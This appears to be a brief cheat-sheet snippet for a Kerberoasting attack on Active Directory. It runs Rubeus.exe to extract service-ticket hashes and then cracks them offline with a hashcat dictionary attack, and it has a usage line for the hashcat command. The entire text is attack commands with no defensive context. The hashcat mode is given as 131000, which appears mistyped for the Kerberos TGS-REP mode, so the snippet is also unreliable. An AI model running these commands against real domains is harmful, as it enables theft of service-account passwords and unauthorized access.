```bash
Rubeus.exe kerberoast

#After you get the hash crack with hashcat

hashcat -m 131000 -a 0 hash.txt Pass.txt

#usage
hashcat -m 131000 -a 0 [hash file] [password list file]
```


